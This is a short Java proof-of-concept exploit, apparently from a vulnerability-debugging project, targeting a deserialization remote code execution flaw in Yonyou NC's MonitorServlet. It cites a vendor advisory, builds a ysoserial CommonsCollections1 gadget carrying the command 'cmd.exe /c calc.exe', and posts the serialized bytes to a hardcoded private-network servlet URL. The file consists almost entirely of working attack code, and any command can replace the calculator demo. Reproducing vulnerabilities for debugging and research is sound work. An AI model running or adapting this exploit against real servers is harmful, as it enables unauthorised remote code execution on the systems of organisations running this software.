package cve.nc;

import com.pacemrc.vuldebug.common.utils.basic.ObjectUtil;
import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import nc.bs.framework.mx.monitor.MonitorServlet;
import org.apache.http.client.methods.HttpPost;
import ysoserial.payloads.ObjectPayload;


/**
 * 漏洞：
 * https://security.yonyou.com/#/noticeInfo?id=350
 *
 * 关键调试类：
 * nc.bs.framework.mx.monitor.MonitorServlet#doAction
 */
public class MonitorServlet_RCE {

    public static void main(String[] args) throws Exception {

        String url = "http://10.58.120.201/servlet/~uapfw/nc.bs.framework.mx.monitor.MonitorServlet";
//        String url = "http://10.58.120.201/service/monitorservlet";
        String gadget = "CommonsCollections1";
        String cmd = "cmd.exe /c calc.exe";
        ObjectPayload<?> payload = (ObjectPayload) Class.forName("ysoserial.payloads." + gadget).newInstance();
        Object obj = payload.getObject(cmd);

        byte[] bytes = ObjectUtil.getByte(obj);

        HttpRequest httpRequest = new HttpRequest();
        HttpPost httpPost = new HttpPost(url);
        httpRequest.sendByteArrayPost(httpPost, bytes);

    }
}
